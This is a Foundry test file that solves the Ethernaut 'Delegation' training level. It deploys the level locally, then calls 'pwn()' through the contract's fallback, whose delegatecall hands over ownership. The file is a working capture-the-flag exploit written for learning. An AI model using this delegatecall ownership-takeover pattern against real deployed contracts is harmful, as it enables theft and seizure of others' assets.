// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Test, console} from "forge-std/Test.sol";
import {StdCheats} from "forge-std/StdCheats.sol";
import "../src/Delegation/DelegationFactory.sol";
import "../src/Ethernaut.sol";

contract DelegationTest is StdCheats, Test {
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
    }

    function testDelegationHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        DelegationFactory delegationFactory = new DelegationFactory();
        ethernaut.registerLevel(delegationFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(delegationFactory);
        Delegation ethernautDelegation = Delegation(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        (bool success,) = address(ethernautDelegation).call(abi.encodeWithSignature("pwn()"));
        require(success, "");

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
